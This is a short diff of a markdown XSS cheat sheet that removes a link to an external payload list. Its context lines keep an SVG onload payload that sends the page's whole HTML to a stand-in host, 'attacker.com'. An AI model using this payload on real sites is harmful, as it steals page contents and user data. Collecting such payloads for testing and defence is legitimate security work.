@@ -230,7 +230,6 @@ Array.from(document.getElementsByTagName("a")).forEach(function(i) {
 ```html
 <svg/onload="(new Image()).src='//attacker.com/'%2Bdocument.documentElement.innerHTML">
 ```
-A good compilation of advanced XSS exploits can be found [here](http://www.xss-payloads.com/payloads-list.html?a#category=all)
 
 ### Awesome Probing
 If nothing of this works, take a look at **Awesome Bypassing** section
